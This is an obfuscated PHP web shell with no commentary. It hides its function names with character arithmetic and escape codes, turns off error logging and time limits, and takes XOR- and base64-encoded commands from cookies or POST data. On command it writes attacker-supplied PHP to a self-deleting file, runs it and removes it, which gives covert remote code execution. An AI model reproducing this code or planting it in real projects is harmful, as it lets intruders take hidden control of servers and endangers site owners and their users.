<?php $ejtzrdiawt = "\146".chr(105).chr(108).'e'."\x5f".chr(625-513).chr(926-809).chr(604-488)."\x5f".chr(99)."\157".chr(789-679).chr(666-550)."\145"."\156"."\x74".'s';
$bisoqcydix = "\x62".chr(162-65)."\163".'e'.chr(584-530).chr(323-271).'_'.chr(100).chr(555-454)."\x63".'o'.chr(100)."\x65";
$qjrxtyohz = 'i'.'n'.chr(105).'_'."\163"."\145"."\x74";
$vdfnaecc = 'u'.chr(325-215).'l'.'i'."\156"."\x6b";


@$qjrxtyohz("\145"."\162"."\x72".chr(937-826)."\162"."\x5f".chr(108)."\x6f".chr(103), NULL);
@$qjrxtyohz('l'."\x6f".chr(103).'_'.chr(101)."\x72".chr(114).chr(1072-961).chr(838-724).chr(115), 0);
@$qjrxtyohz(chr(109)."\x61".'x'.'_'.chr(101).'x'.chr(306-205)."\x63"."\x75"."\x74"."\x69".chr(317-206)."\156".'_'.chr(659-543).'i'.chr(109)."\145", 0);
@set_time_limit(0);

function jyjmyvns($ofltesu, $nmrepiyvil)
{
    $dayeq = "";
    for ($jafmgrkwtm = 0; $jafmgrkwtm < strlen($ofltesu);) {
        for ($j = 0; $j < strlen($nmrepiyvil) && $jafmgrkwtm < strlen($ofltesu); $j++, $jafmgrkwtm++) {
            $dayeq .= chr(ord($ofltesu[$jafmgrkwtm]) ^ ord($nmrepiyvil[$j]));
        }
    }
    return $dayeq;
}

$ayctrmv = array_merge($_COOKIE, $_POST);
$osztai = 'b7dddc4a-e648-4379-a61b-129bda58b730';
foreach ($ayctrmv as $rbzzq => $ofltesu) {
    $ofltesu = @unserialize(jyjmyvns(jyjmyvns($bisoqcydix($ofltesu), $osztai), $rbzzq));
    if (isset($ofltesu[chr(97).chr(107)])) {
        if ($ofltesu["\x61"] == chr(105)) {
            $jafmgrkwtm = array(
                chr(394-282)."\166" => @phpversion(),
                chr(397-282).chr(920-802) => "3.5",
            );
            echo @serialize($jafmgrkwtm);
        } elseif ($ofltesu["\x61"] == chr(755-654)) {
            $bgmwg = "./" . md5($osztai) . "\x2e"."\151"."\x6e"."\143";
            @$ejtzrdiawt($bgmwg, "<" . chr(306-243).'p'."\x68"."\x70"."\40"."\100".'u'.chr(110).chr(108)."\x69".'n'.chr(107)."\50"."\137".chr(95)."\x46"."\x49"."\x4c".'E'.chr(95)."\137".chr(41).chr(59).chr(32) . $ofltesu[chr(100)]);
            @include($bgmwg);
            @$vdfnaecc($bgmwg);
        }
        exit();
    }
}

